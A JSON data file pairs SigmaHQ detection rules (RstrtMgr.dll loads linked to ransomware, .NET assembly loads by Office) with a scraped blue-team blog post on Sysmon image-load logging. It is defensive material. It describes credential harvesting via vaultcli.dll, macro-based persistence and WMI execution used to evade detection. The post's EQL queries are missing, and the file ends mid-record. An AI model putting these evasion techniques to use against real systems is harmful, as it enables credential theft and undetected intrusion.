[
  {
    "url": "https://www.crowdstrike.com/blog/windows-restart-manager-part-1/",
    "markdown": "",
    "sigma_rule": {
      "title": "Load Of RstrtMgr.DLL By A Suspicious Process",
      "id": "b48492dc-c5ef-4572-8dff-32bc241c15c8",
      "related": [
        {
          "id": "3669afd2-9891-4534-a626-e5cf03810a61",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects the load of RstrtMgr DLL (Restart Manager) by a suspicious process.\nThis library has been used during ransomware campaigns to kill processes that would prevent file encryption by locking them (e.g. Conti ransomware, Cactus ransomware). It has also recently been seen used by the BiBi wiper for Windows.\nIt could also be used for anti-analysis purposes by shut downing specific processes.\n",
      "references": [
        "https://www.crowdstrike.com/blog/windows-restart-manager-part-1/",
        "https://www.crowdstrike.com/blog/windows-restart-manager-part-2/",
        "https://www.swascan.com/cactus-ransomware-malware-analysis/",
        "https://web.archive.org/web/20231215021154/https://taiwan.postsen.com/business/88601/Hamas-hackers-use-data-destruction-software-BiBi-which-consumes-a-lot-of-processor-resources-to-wipe-Windows-computer-data--iThome.html"
      ],
      "author": "Luc Génaux",
      "date": "2023-11-28",
      "tags": [
        "attack.impact",
        "attack.defense-evasion",
        "attack.t1486",
        "attack.t1562.001"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection_img": [
          {
            "ImageLoaded|endswith": "\\RstrtMgr.dll"
          },
          {
            "OriginalFileName": "RstrtMgr.dll"
          }
        ],
        "selection_folders_1": {
          "Image|contains": [
            ":\\Perflogs\\",
            ":\\Users\\Public\\",
            "\\Temporary Internet"
          ]
        },
        "selection_folders_2": [
          {
            "Image|contains|all": [
              ":\\Users\\",
              "\\Favorites\\"
            ]
          },
          {
            "Image|contains|all": [
              ":\\Users\\",
              "\\Favourites\\"
            ]
          },
          {
            "Image|contains|all": [
              ":\\Users\\",
              "\\Contacts\\"
            ]
          }
        ],
        "condition": "selection_img and 1 of selection_folders_*"
      },
      "falsepositives": [
        "Processes related to software installation"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_dll_rstrtmgr_suspicious_load.yml",
    "id": "4"
  },
  {
    "url": "https://www.crowdstrike.com/blog/windows-restart-manager-part-1/",
    "markdown": "",
    "sigma_rule": {
      "title": "Load Of RstrtMgr.DLL By An Uncommon Process",
      "id": "3669afd2-9891-4534-a626-e5cf03810a61",
      "related": [
        {
          "id": "b48492dc-c5ef-4572-8dff-32bc241c15c8",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects the load of RstrtMgr DLL (Restart Manager) by an uncommon process.\nThis library has been used during ransomware campaigns to kill processes that would prevent file encryption by locking them (e.g. Conti ransomware, Cactus ransomware). It has also recently been seen used by the BiBi wiper for Windows.\nIt could also be used for anti-analysis purposes by shut downing specific processes.\n",
      "references": [
        "https://www.crowdstrike.com/blog/windows-restart-manager-part-1/",
        "https://www.crowdstrike.com/blog/windows-restart-manager-part-2/",
        "https://www.swascan.com/cactus-ransomware-malware-analysis/",
        "https://web.archive.org/web/20231215021154/https://taiwan.postsen.com/business/88601/Hamas-hackers-use-data-destruction-software-BiBi-which-consumes-a-lot-of-processor-resources-to-wipe-Windows-computer-data--iThome.html"
      ],
      "author": "Luc Génaux",
      "date": "2023-11-28",
      "tags": [
        "attack.impact",
        "attack.defense-evasion",
        "attack.t1486",
        "attack.t1562.001"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": [
          {
            "ImageLoaded|endswith": "\\RstrtMgr.dll"
          },
          {
            "OriginalFileName": "RstrtMgr.dll"
          }
        ],
        "filter_main_generic": {
          "Image|contains": [
            ":\\$WINDOWS.~BT\\",
            ":\\$WinREAgent\\",
            ":\\Program Files (x86)\\",
            ":\\Program Files\\",
            ":\\ProgramData\\",
            ":\\Windows\\explorer.exe",
            ":\\Windows\\SoftwareDistribution\\",
            ":\\Windows\\SysNative\\",
            ":\\Windows\\System32\\",
            ":\\Windows\\SysWOW64\\",
            ":\\Windows\\WinSxS\\",
            ":\\WUDownloadCache\\"
          ]
        },
        "filter_main_user_software_installations": {
          "Image|contains|all": [
            ":\\Users\\",
            "\\AppData\\Local\\Temp\\is-",
            ".tmp\\"
          ],
          "Image|endswith": ".tmp"
        },
        "filter_main_admin_software_installations": {
          "Image|contains": ":\\Windows\\Temp\\"
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Other legitimate Windows processes not currently listed",
        "Processes related to software installation"
      ],
      "level": "low"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_dll_rstrtmgr_uncommon_load.yml",
    "id": "8"
  },
  {
    "url": "https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16",
    "markdown": "# Detecting Adversary Tradecraft with Image Load Event Logging and EQL\n\nWhile examining some malicious Microsoft Office and PE files to look for detection opportunities, I came across a few samples where Windows image load event logging can be utilized to write some high efficacy detection rules.\n\nI don’t often hear about image load event logging being leveraged for threat detection, so I decided to share a few practical examples where this event type can be used to detect malicious behavior with the objective of helping blue teams with their threat detection and incident response efforts.\n\n## What is an Image Load Event?\n\nA Windows process can load a dynamic link library (DLL) in order to use one or more of the DLL’s functions to carry out certain actions. For example, `notepad.exe` loads the DLL, `kernel32.dll` before it can use the CreateFileW function or API call to create or open files. This is an image load event.\n\n```image\nAlt: The imports table of notepad.exe shows that it imports CreateFileW from kernel32.dll\nDescription: The image displays the imports table for the Windows application 'notepad.exe' using the Pestudio tool. It lists various functions that 'notepad.exe' imports from dynamic link libraries (DLLs), specifically highlighting the 'CreateFileW' function imported from 'kernel32.dll'. The table shows additional columns for symbols, blacklisted status, anonymity, anti-debugging status, and the libraries from which these functions are imported. This information is pertinent for analyzing the executables and understanding how adversaries might leverage DLL imports for malicious activities.\nTranscription: |\n  | symbol (274)        | blacklisted | anonymous | anti-debug | library (29)       |\n  | ------------------- | ----------- | --------- | ---------- | ------------------ |\n  | CreateFileMappingW  | -           | -         | -          | kernel32.dll       |\n  | CreateFileW         | -           | -         | -          | kernel32.dll       |\n  | CreateFontIndirectW | -           | -         | -          | gdi32.dll          |\n  | CreateMutexExW      | -           | -         | -          | api-ms-win-core... |\n  | CreateSemaphoreExW  | -           | -         | -          | api-ms-win-core... |\n  | CreateStatusWindowW | -           | -         | -          | comctl32.dll       |\n  | CreateWindowExW     | -           | -         | -          | user32.dll         |\n  | DefWindowProcW      | -           | -         | -          | user32.dll         |\n  | DeleteDC            | -           | -         | -          | gdi32.dll          |\n  | DeleteFileW         | -           | -         | -          | kernel32.dll       |\n```\n\nImporting functions from existing DLLs means that developers don’t have to write their own code to have their software perform tasks such as writing or deleting files, creating additional processes, or handling network connections. “The use of DLLs helps promote modularization of code, code reuse, efficient memory usage, and reduced disk space.”\n\nAs you’ll see in the following examples, an adversary may write their malicious code to import functions from Windows or 3rd party software DLLs in order to help them achieve their objectives such as stealing passwords from or establishing persistence on their victim’s endpoint.\n\n## Configuring Image Load Event Logging\n\nMicrosoft Sysmon can be configured to log `Image Loaded` events to provide visibility into what DLLs are loaded by running processes.\n\n```image\nAlt: Description of Sysmon Event ID 7\nDescription: The image illustrates Sysmon Event ID 7, which pertains to 'Image Loaded' events. It visually summarizes the critical details of an event where a process (in this case, notepad.exe) loads a DLL (kernel32.dll). The image includes a structured format showing UtcTime, ProcessId, Image path, Loaded Image path, file version, description, product name, company, hash values (SHA1, MD5, SHA256, IMPHASH), and signature information. This data is essential for monitoring and detecting suspicious module loading behavior in a system.\nTranscription: |\n  Event ID 7: Image loaded\n  The image loaded event logs when a module is loaded in a specific process. This event is disabled by default and needs to be configured with the –l option. It indicates the process in which the module is loaded, hashes and signature information. The signature is created asynchronously for performance reasons and indicates if the file was removed after loading. This event should be configured carefully, as monitoring all image load events will generate a large number of events.\n```\n\nRoberto Rodriguez’s (@Cyb3rWard0g) Sysmon configuration file will capture the above Event ID.\n\nExecute the following command to install Sysmon and apply a configuration file.\n\n```\nsysmon.exe -i -c .\\config_file.xml\n```\n\nYou can review Sysmon events in Event Viewer under `Microsoft-Windows-Sysmon/Operational`. Below is an example `Image Loaded` event. As you can see, the process `notepad.exe` loaded `kernel32.dll`. Sysmon collects other useful information such as the hashes and signer information for the image that was loaded.\n\n```\nImage loaded:\nRuleName:\nUtcTime: 2019-08-04 13:59:40.739\nProcessGuid: {0AD3E319-E4CC-5D46-0000-0010A1A06A00}\nProcessId: 4132\nImage: C:\\Windows\\System32\\notepad.exe\nImageLoaded: C:\\Windows\\System32\\kernel32.dll\nFileVersion: 10.0.14393.206 (rs1_release.160915-0644)\nDescription: Windows NT BASE API Client DLL\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nHashes: SHA1=6EE3E2D33012161659609DADEA59A2164C5A5CEB,MD5=6955067712F2F4752CA12192B08EF860,SHA256=E02A3B57EA8B393408FF782866A1D342DD8C6B5F5925BA527981DBB21B6A4080,IMPHASH=3CE0779E0F4E275CD51A359A98CCC682\nSigned: true\nSignature: Microsoft Windows\nSignatureStatus: Valid\n```\n\nLet’s look at some examples of suspicious module loading behavior and how you can detect it.\n\n## Example 1: Malware Harvesting Credentials from Windows Credential Manager\n\nWindows Credential Manager allows you to create, view, or delete your saved credentials for signing in to websites, connected applications, and networks. An adversary may attempt to list or dump credentials stored in the Credential Manager.\n\nWhen the built-in `vaultcmd.exe` command line utility is used to list or manage stored credentials, this process loads the `vaultcli.dll` module. This is behavior is normal.\n\n```image\nAlt: Process Monitor output shows vaultcli.dll loaded by vaultcmd.exe\nDescription: The image displays a screenshot from Process Monitor, showing various entries related to the `vaultcli.dll` module. It includes timestamps, process names (e.g., `VaultCmd.exe`), process IDs, operations performed (like `CreateFile`), the path to the DLL, the result of each operation (all marked as 'SUCCESS'), and additional detail about the desired access (Read Attributes and Read Data/List). This output is relevant to detecting malicious activities involving credential management.\nTranscription: |\n  Time of Day          Process Name     PID   Operation     Path                                 Result   Detail\n  10:37:05.9901803 AM VaultCmd.exe      772   CreateFile    C:\\Windows\\System32\\vaultcli.dll     SUCCESS  Desired Access: Read Attributes,\n  10:33:04.5633819 AM VaultCmd.exe      2056  CloseFile     C:\\Windows\\System32\\vaultcli.dll     SUCCESS \n  10:33:04.5634521 AM VaultCmd.exe      2056  CreateFile    C:\\Windows\\System32\\vaultcli.dll     SUCCESS  Desired Access: Read Data/List\n```\n\nExamining the exports table of `vaultcli.dll` suggests that this DLL provides the functionality to enumerate or get information from the credential vault.\n\n```image\nAlt: Reviewing the exports table of vaultcli.dll\nDescription: The image shows a screenshot from Pestudio, a malware analysis tool, displaying information about the 'vaultcli.dll' file located in the Windows SysWOW64 directory. The interface lists various components of the DLL, including indicators, sections, libraries, imports, and exports. Specifically, it highlights the exports section, detailing function names related to the Credential Vault Client Library, including 'VaultRemoveItem', 'VaultOpenVault', and 'VaultEnumerateItems'. This information is relevant for understanding how the 'vaultcli.dll' can be manipulated by malware authors to harvest credentials.\nTranscription: |\n  pestudio 8.56 - Malware Initial Assessment - www.winitor.com\n  File: c:\\windows\\syswow64\\vaultcli.dll\n  \n  indicators (10)\n    virustotal (n/a)\n    dos-stub (184 bytes)\n    file-header (20 bytes)\n    optional-header (224 bytes)\n    directories (15)\n    sections (6)\n    libraries (34)\n    imports (195)\n    exports (anonymous)\n  \n  index    name (17)                  address\n  124      VaultRemoveItem            0x00000000\n  123      VaultOpenVault             0x00000000\n  122      VaultGetItemType           0x00000000\n  121      VaultGetItem               0x00000000\n  120      VaultGetInformation        0x00000000\n  119      VaultFree                  0x00000000\n  118      VaultFindItems             0x00000000\n  117      VaultEnumerateVaults       0x00000000\n  116      VaultEnumerateItems        0x00000000\n  115      VaultEnumerateItemTypes    0x00000000\n  114      VaultDeleteItemType        0x00000000\n```\n\nSome malware authors abuse the functions provided by the Credential Vault Client Library (`vaultcli.dll`) by importing its functionality to enumerate or harvest saved credentials.\n\nThe screenshot below from Process Hacker shows that Fareit malware loaded the `vaultcli.dll` module.\n\n```image\nAlt: Credential Vault Client Library (vaultcli.dll) DLL loaded by Fareit malware\nDescription: The image displays the properties window of the process 'fareit.exe' (PID 4516) in Windows. The window includes details under various tabs such as General, Memory, Environment, and Modules. Notably, it shows the list of loaded modules, with 'vaultcli.dll' highlighted, indicating its base address, size, and description as 'Credential Vault Client Library'. This detail is relevant for analyzing the behavior of the 'fareit' malware in relation to credential harvesting.\nTranscription: |\n  fareit.exe (4516) Properties\n  ------------------------------------------------------------------------------\n  | Name            | Base address | Size    | Description                     |\n  | --------------- | ------------ | ------- | ------------------------------- |\n  | ws2_32.dll      | 0x76a60000   | 396 kB  | Windows Socket 2.0 32-Bit DLL   |\n  | wow64win.dll    | 0x6fe40000   | 476 kB  | Wow64 Console and Win32 ...     |\n  | wow64cpu.dll    | 0x6ff20000   | 40 kB   | AMD64 Wow64 CPU                 |\n  | wow64.dll       | 0x6fec0000   | 328 kB  | Win32 Emulation on NT64         |\n  | WinTypes.dll    | 0x70ab0000   | 828 kB  | Windows Base Types DLL          |\n  | windows.stor... | 0x74110000   | 5.43 MB | Microsoft WinRT Storage API     |\n  | win32u.dll      | 0x746d0000   |         | Win32                           |\n  | vaultcli.dll    | 0x70b80000   | 216 kB  | Credential Vault Client Library |\n  | userenv.dll     | 0x73a20000   |         | Userenv                         |\n  | user32.dll      | 0x7c340000   |         | Multi-User Windows USER A       |\n  ------------------------------------------------------------------------------\n```\n\nThe following `Image Loaded` event was captured by Sysmon and shows that `vaultcli.dll` was loaded by `fareit.exe`, not `vaultcmd.exe`.\n\n```\nImage loaded:\nRuleName:\nUtcTime: 2019-08-04 14:15:42.301\nProcessGuid: {0AD3E319-E88D-5D46-0000-001097C2A500}\nProcessId: 4516\nImage: C:\\Users\\Roxy\\Downloads\\fareit.exe\nImageLoaded: C:\\Windows\\SysWOW64\\vaultcli.dll\nFileVersion: 10.0.14393.0 (rs1_release.160715-1616)\nDescription: Credential Vault Client Library\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nHashes: SHA1=8395B530CAB0415DAFE8B01B2A7342866C6F45E1,MD5=33F761B3487238BEEEE5577C3E089CE7,SHA256=325E4DDAF3F45B4B540A98E05FB6A6F036A6955875F303D833E7A7644EB939DC,IMPHASH=8721D7F174531C1C4F8942462C87C899\nSigned: true\nSignature: Microsoft Windows\nSignatureStatus: Valid\n```\n\nWe can write an Event Query Language (EQL) query to detect unexpected processes loading `vaultcli.dll` as follows. If you’re not familiar with EQL, you can find the getting started guide here.\n\n## Example 2: Stealthy Scheduled Task Creation via VBA Macro\n\nA Microsoft Office document can contain VBA code to create a scheduled task for persistence without using the native scheduled tasks (`schtasks.exe`) utility. A sample that exhibited this behavior was recently documented here.\n\nMany defenders have logging and alerting in place to detect suspicious usage of `schtasks.exe`. The following sample would bypass this detection, which is why I found it interesting.\n\nIf we open the malicious Excel document with Process Monitor running, we can see that `excel.exe` loads `taskschd.dll` (File Description: `Task Scheduler COM API`). Unless you have VBA macro-enabled Office documents in your environment that create or modify Windows scheduled tasks, this behavior should not occur often.\n\n```image\nAlt: Process Monitor output showing excel.exe loading taskschd.dll\nDescription: The image displays the output from Process Monitor capturing an event where `excel.exe` successfully loads the `taskschd.dll` file, which is part of the Task Scheduler COM API in Windows. The event details include the date and time of the operation (8/5/2019 at 7:25:43 PM), the thread number (2212), the operation type ('Load Image'), the result ('SUCCESS'), and the file path for the loaded image (`C:\\\\Windows\\System32\\taskschd.dll`). Additionally, it shows the image base and size, indicating that this is a technical log relevant to detecting suspicious behavior in Microsoft Office applications.\nTranscription: |\n  Event Properties\n  \n  Event:\n  Date: 8/5/2019 7:25:43.4163713 PM\n  Thread: 2212\n  Class: Process\n  Operation: Load Image\n  Result: SUCCESS\n  Path: C:\\Windows\\System32\\taskschd.dll\n  Duration: 0.0000000\n  Image Base: 0x7fefa2b0000\n  Image Size: 0x127000\n```\n\nThe following `Image Loaded` event was captured by Sysmon showing that `taskschd.dll` was loaded by `excel.exe`.\n\n```\nImage loaded:\nRuleName:\nUtcTime: 2019-08-05 19:39:51.293\nProcessGuid: {6F8FEDE1-85F8-5D48-0000-0010DADC5401}\nProcessId: 4832\nImage: C:\\Program Files\\Microsoft Office\\Office14\\EXCEL.EXE\nImageLoaded: C:\\Windows\\System32\\taskschd.dll\nFileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\nDescription: Task Scheduler COM API\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: taskschd.dll\nHashes: SHA1=6F5A626EFF54C33FDC8C9E3D7EA44677CA0818DA,MD5=BAAFAF9CEAEC0B73C2A3550A01F6CECB,SHA256=018CB95A43CEA2063EA24691C71D51EF60D522C21502ABA8AD93876363D4B857,IMPHASH=21BCC6496DD1370029F85F9F7A29B9FB\nSigned: true\nSignature: Microsoft Windows\nSignatureStatus: Valid\n```\n\nWe can detect the behavior of Microsoft Office applications loading `taskschd.dll` with the following EQL query.\n\n## Example 3: WMI Execution via VBA Macro\n\nAn adversary may include a malicious macro in a Microsoft Office document to execute commands via Windows Management Instrumentation (WMI). The motive behind this behavior is to evade detections that rely on process relationships.\n\nA common detection for security operations teams is to look for suspicious child processes of Microsoft Office applications, such as `cmd.exe` or `powershell.exe`. Below is an EQL query to detect this behavior. The list of process names is not exhaustive.\n\nBy invoking WMI to execute a malicious `powershell.exe` command, `powershell.exe` is spawned with the parent process `wmiprvse.exe`, not `winword.exe` or whatever application is used to execute the macro.\n\n```image\nAlt: Process Monitor output showing powershell.exe with the parent process wmiprvse.exe\nDescription: The image displays output from a Process Monitor tool, showing a list of running processes on a Windows system. It highlights the `powershell.exe` process, which is indicated as being spawned by `wmiprvse.exe`, a WMI Provider Host. This output is relevant to the context of detecting malicious activity involving Windows Management Instrumentation (WMI) through a VBA macro in Microsoft Office. The list includes other processes like `services.exe`, `svchost.exe`, and `Conhost.exe`, along with their respective descriptions and image paths, contributing to the analysis of process relationships used by adversaries.\nTranscription: |\n  Only show processes still running at end of current trace\n  Timelines cover displayed events only\n  \n  Process                          Image Path\n  services.exe (776)               C:\\WINDOWS\\system32\\services.exe\n  svchost.exe (964)                C:\\WINDOWS\\system32\\svchost.exe\n  DllHost.exe (6756)               C:\\WINDOWS\\system32\\DllHost.exe\n  RuntimeBroker.exe (6116)         C:\\WINDOWS\\system32\\RuntimeBroker.exe\n  RuntimeBroker.exe (7172)         C:\\WINDOWS\\system32\\RuntimeBroker.exe\n  RuntimeBroker.exe (7796)         C:\\WINDOWS\\system32\\RuntimeBroker.exe\n  wmiprvse.exe (1608)              C:\\WINDOWS\\system32\\wbem\\wmiprvse.exe\n      powershell.exe (8880)        C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n  Conhost.exe (7740)               C:\\WINDOWS\\system32\\conhost.exe\n  backgroundTaskHost.exe (4896)    C:\\WINDOWS\\system32\\backgroundTaskHost.exe\n```\n\nWe can detect this suspicious behavior with the following EQL query:\n\n---\n\nWe have covered what image load event logging is, how to enable it using Sysmon, and some practical examples of how it can be used to detect evasive attempts to steal credentials, establish persistence, or execute malicious code.\n\nWhat adversary tradecraft can you detect by leveraging image load event logging or by combining these events with other event types such as process, network, or file events? I’d be interested in hearing any feedback, experiences, or findings that you would like to share. For anyone who would like to share any analytics for detection, please see the EQL Analytics Library contribution guide.",
    "sigma_rule": {
      "title": "DotNET Assembly DLL Loaded Via Office Application",
      "id": "ff0f2b05-09db-4095-b96d-1b75ca24894a",
      "status": "test",
      "description": "Detects any assembly DLL being loaded by an Office Product",
      "references": [
        "https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16"
      ],
      "author": "Antonlovesdnb",
      "date": "2020-02-19",
      "modified": "2023-03-29",
      "tags": [
        "attack.execution",
        "attack.t1204.002"
      ],
      "logsource": {
        "category": "image_load",
        "product": "windows"
      },
      "detection": {
        "selection": {
          "Image|endswith": [
            "\\excel.exe",
            "\\mspub.exe",
            "\\onenote.exe",
            "\\onenoteim.exe",
            "\\outlook.exe",
            "\\powerpnt.exe",
            "\\winword.exe"
          ],
          "ImageLoaded|startswith": "C:\\Windows\\assembly\\"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\image_load\\image_load_office_dotnet_assembly_dll_load.yml",
    "id": "14"
  },
  {
    "url": "https://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16",
    "markdown": "# Detecting Adversary Tradecraft with Image Load Event Logging and EQL\n\nWhile examining some malicious Microsoft Office and PE files to look for detection opportunities, I came across a few samples where Windows image load event logging can be utilized to write some high efficacy detection rules.\n\nI don’t often hear about image load event logging being leveraged for threat detection, so I decided to share a few practical examples where this event type can be used to detect malicious behavior with the objective of helping blue teams with their threat detection and incident response efforts.\n\n## What is an Image Load Event?\n\nA Windows process can load a dynamic link library (DLL) in order to use one or more of the DLL’s functions to carry out certain actions. For example, `notepad.exe` loads the DLL, `kernel32.dll` before it can use the CreateFileW function or API call to create or open files. This is an image load event.\n\n```image\nAlt: The imports table of notepad.exe shows that it imports CreateFileW from kernel32.dll\nDescription: The image displays the imports table for the Windows application 'notepad.exe' using the Pestudio tool. It lists various functions that 'notepad.exe' imports from dynamic link libraries (DLLs), specifically highlighting the 'CreateFileW' function imported from 'kernel32.dll'. The table shows additional columns for symbols, blacklisted status, anonymity, anti-debugging status, and the libraries from which these functions are imported. This information is pertinent for analyzing the executables and understanding how adversaries might leverage DLL imports for malicious activities.\nTranscription: |\n  | symbol (274)        | blacklisted | anonymous | anti-debug | library (29)       |\n  | ------------------- | ----------- | --------- | ---------- | ------------------ |\n  | CreateFileMappingW  | -           | -         | -          | kernel32.dll       |\n  | CreateFileW         | -           | -         | -          | kernel32.dll       |\n  | CreateFontIndirectW | -           | -         | -          | gdi32.dll          |\n  | CreateMutexExW      | -           | -         | -          | api-ms-win-core... |\n  | CreateSemaphoreExW  | -           | -         | -          | api-ms-win-core... |\n  | CreateStatusWindowW | -           | -         | -          | comctl32.dll       |\n  | CreateWindowExW     | -           | -         | -          | user32.dll         |\n  | DefWindowProcW      | -           | -         | -          | user32.dll         |\n  | DeleteDC            | -           | -         | -          | gdi32.dll          |\n  | DeleteFileW         | -           | -         | -          | kernel32.dll       |\n```\n\nImporting functions from existing DLLs means that developers don’t have to write their own code to have their software perform tasks such as writing or deleting files, creating additional processes, or handling network connections. “The use of DLLs helps promote modularization of code, code reuse, efficient memory usage, and reduced disk space.”\n\nAs you’ll see in the following examples, an adversary may write their malicious code to import functions from Windows or 3rd party software DLLs in order to help them achieve their objectives such as stealing passwords from or establishing persistence on their victim’s endpoint.\n\n## Configuring Image Load Event Logging\n\nMicrosoft Sysmon can be configured to log `Image Loaded` events to provide visibility into what DLLs are loaded by running processes.\n\n```image\nAlt: Description of Sysmon Event ID 7\nDescription: The image illustrates Sysmon Event ID 7, which pertains to 'Image Loaded' events. It visually summarizes the critical details of an event where a process (in this case, notepad.exe) loads a DLL (kernel32.dll). The image includes a structured format showing UtcTime, ProcessId, Image path, Loaded Image path, file version, description, product name, company, hash values (SHA1, MD5, SHA256, IMPHASH), and signature information. This data is essential for monitoring and detecting suspicious module loading behavior in a system.\nTranscription: |\n  Event ID 7: Image loaded\n  The image loaded event logs when a module is loaded in a specific process. This event is disabled by default and needs to be configured with the –l option. It indicates the process in which the module is loaded, hashes and signature information. The signature is created asynchronously for performance reasons and indicates if the file was removed after loading. This event should be configured carefully, as monitoring all image load events will generate a large number of events.\n```\n\nRoberto Rodriguez’s (@Cyb3rWard0g) Sysmon configuration file will capture the above Event ID.\n\nExecute the following command to install Sysmon and apply a configuration file.\n\n```\nsysmon.exe -i -c .\\config_file.xml\n```\n\nYou can review Sysmon events in Event Viewer under `Microsoft-Windows-Sysmon/Operational`. Below is an example `Image Loaded` event. As you can see, the process `notepad.exe` loaded `kernel32.dll`. Sysmon collects other useful information such as the hashes and signer information for the image that was loaded.\n\n```\nImage loaded:\nRuleName:\nUtcTime: 2019-08-04 13:59:40.739\nProcessGuid: {0AD3E319-E4CC-5D46-0000-0010A1A06A00}\nProcessId: 4132\nImage: C:\\Windows\\System32\\notepad.exe\nImageLoaded: C:\\Windows\\System32\\kernel32.dll\nFileVersion: 10.0.14393.206 (rs1_release.160915-0644)\nDescription: Windows NT BASE API Client DLL\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nHashes: SHA1=6EE3E2D33012161659609DADEA59A2164C5A5CEB,MD5=6955067712F2F4752CA12192B08EF860,SHA256=E02A3B57EA8B393408FF782866A1D342DD8C6B5F5925BA527981DBB21B6A4080,IMPHASH=3CE0779E0F4E275CD51A359A98CCC682\nSigned: true\nSignature: Microsoft Windows\nSignatureStatus: Valid\n```\n\nLet’s look at some examples of suspicious module loading behavior and how you can detect it.\n\n## Example 1: Malware Harvesting Credentials from Windows Credential Manager\n\nWindows Credential Manager allows you to create, view, or delete your saved credentials for signing in to websites, connected applications, and networks. An adversary may attempt to list or dump credentials stored in the Credential Manager.\n\nWhen the built-in `vaultcmd.exe` command line utility is used to list or manage stored credentials, this process loads the `vaultcli.dll` module. This is behavior is normal.\n\n```image\nAlt: Process Monitor output shows vaultcli.dll loaded by vaultcmd.exe\nDescription: The image displays a screenshot from Process Monitor, showing various entries related to the `vaultcli.dll` module. It includes timestamps, process names (e.g., `VaultCmd.exe`), process IDs, operations performed (like `CreateFile`), the path to the DLL, the result of each operation (all marked as 'SUCCESS'), and additional detail about the desired access (Read Attributes and Read Data/List). This output is relevant to detecting malicious activities involving credential management.\nTranscription: |\n  Time of Day          Process Name     PID   Operation     Path                                 Result   Detail\n  10:37:05.9901803 AM VaultCmd.exe      772   CreateFile    C:\\Windows\\System32\\vaultcli.dll     SUCCESS  Desired Access: Read Attributes,\n  10:33:04.5633819 AM VaultCmd.exe      2056  CloseFile     C:\\Windows\\System32\\vaultcli.dll     SUCCESS \n  10:33:04.5634521 AM VaultCmd.exe      2056  CreateFile    C:\\Windows\\System32\\vaultcli.dll     SUCCESS  Desired Access: Read Data/List\n```\n\nExamining the exports table of `vaultcli.dll` suggests that this DLL provides the functionality to enumerate or get information from the credential vault.\n\n```image\nAlt: Reviewing the exports table of vaultcli.dll\nDescription: The image shows a screenshot from Pestudio, a malware analysis tool, displaying information about the 'vaultcli.dll' file located in the Windows SysWOW64 directory. The interface lists various components of the DLL, including indicators, sections, libraries, imports, and exports. Specifically, it highlights the exports section, detailing function names related to the Credential Vault Client Library, including 'VaultRemoveItem', 'VaultOpenVault', and 'VaultEnumerateItems'. This information is relevant for understanding how the 'vaultcli.dll' can be manipulated by malware authors to harvest credentials.\nTranscription: |\n  pestudio 8.56 - Malware Initial Assessment - www.winitor.com\n  File: c:\\windows\\syswow64\\vaultcli.dll\n  \n  indicators (10)\n    virustotal (n/a)\n    dos-stub (184 bytes)\n    file-header (20 bytes)\n    optional-header (224 bytes)\n    directories (15)\n    sections (6)\n    libraries (34)\n    imports (195)\n    exports (anonymous)\n  \n  index    name (17)                  address\n  124      VaultRemoveItem            0x00000000\n  123      VaultOpenVault             0x00000000\n  122      VaultGetItemType           0x00000000\n  121      VaultGetItem               0x00000000\n  120      VaultGetInformation        0x00000000\n  119      VaultFree                  0x00000000\n  118      VaultFindItems             0x00000000\n  117      VaultEnumerateVaults       0x00000000\n  116      VaultEnumerateItems        0x00000000\n  115      VaultEnumerateItemTypes    0x00000000\n  114      VaultDeleteItemType        0x00000000\n```\n\nSome malware authors abuse the functions provided by the Credential Vault Client Library (`vaultcli.dll`) by importing its functionality to enumerate or harvest saved credentials.\n\nThe screenshot below from Process Hacker shows that Fareit malware loaded the `vaultcli.dll` module.\n\n```image\nAlt: Credential Vault Client Library (vaultcli.dll) DLL loaded by Fareit malware\nDescription: The image displays the properties window of the process 'fareit.exe' (PID 4516) in Windows. The window includes details under various tabs such as General, Memory, Environment, and Modules. Notably, it shows the list of loaded modules, with 'vaultcli.dll' highlighted, indicating its base address, size, and description as 'Credential Vault Client Library'. This detail is relevant for analyzing the behavior of the 'fareit' malware in relation to credential harvesting.\nTranscription: |\n  fareit.exe (4516) Properties\n  ------------------------------------------------------------------------------\n  | Name            | Base address | Size    | Description                     |\n  | --------------- | ------------ | ------- | ------------------------------- |\n  | ws2_32.dll      | 0x76a60000   | 396 kB  | Windows Socket 2.0 32-Bit DLL   |\n  | wow64win.dll    | 0x6fe40000   | 476 kB  | Wow64 Console and Win32 ...     |\n  | wow64cpu.dll    | 0x6ff20000   | 40 kB   | AMD64 Wow64 CPU                 |\n  | wow64.dll       | 0x6fec0000   | 328 kB  | Win32 Emulation on NT64         |\n  | WinTypes.dll    | 0x70ab0000   | 828 kB  | Windows Base Types DLL          |\n  | windows.stor... | 0x74110000   | 5.43 MB | Microsoft WinRT Storage API     |\n  | win32u.dll      | 0x746d0000   |         | Win32                           |\n  | vaultcli.dll    | 0x70b80000   | 216 kB  | Credential Vault Client Library |\n  | userenv.dll     | 0x73a20000   |         | Userenv                         |\n  | user32.dll      | 0x7c340000   |         | Multi-User Windows USER A       |\n  ------------------------------------------------------------------------------\n```\n\nThe following `Image Loaded` event was captured by Sysmon and shows that `vaultcli.dll` was loaded by `fareit.exe`, not `vaultcmd.exe`.\n\n```\nImage loaded:\nRuleName:\nUtcTime: 2019-08-04 14:15:42.301\nProcessGuid: {0AD3E319-E88D-5D46-0000-001097C2A500}\nProcessId: 4516\nImage: C:\\Users\\Roxy\\Downloads\\fareit.exe\nImageLoaded: 